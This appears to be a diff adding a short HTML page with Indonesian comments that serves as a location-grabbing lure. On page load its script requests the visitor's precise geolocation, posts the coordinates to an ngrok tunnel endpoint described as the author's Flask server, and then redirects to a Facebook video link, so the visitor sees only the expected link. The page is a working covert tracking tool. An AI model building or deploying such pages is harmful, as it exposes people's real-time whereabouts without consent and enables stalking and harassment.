@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mengirim lokasi...</title>
+</head>
+<body>
+<script>
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    let latitude = pos.coords.latitude;
+                    let longitude = pos.coords.longitude;
+
+                   fetch("https://849b63e976e4.ngrok-free.app/lokasi", {  // Ganti IP dengan server Flask Anda
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ lat: latitude, lon: longitude })
+                    })
+                    .then(() => {
+                        // Setelah sukses kirim → langsung redirect ke Shopee
+                        window.location.href = "https://www.facebook.com/share/v/19iNkujBRf/";
+                    })
+                    .catch(() => {
+                        // Kalau gagal kirim juga tetap redirect
+                        window.location.href = "https://www.facebook.com/share/v/19iNkujBRf/";
+                    });
+                },
+                function() {
+                    // Kalau gagal ambil lokasi, tetap redirect
+                    window.location.href = "https://www.facebook.com/share/v/19iNkujBRf/";
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            window.location.href = "https://www.facebook.com/share/v/19iNkujBRf/";
+        }
+    };
+</script>
+</body>
+</html>
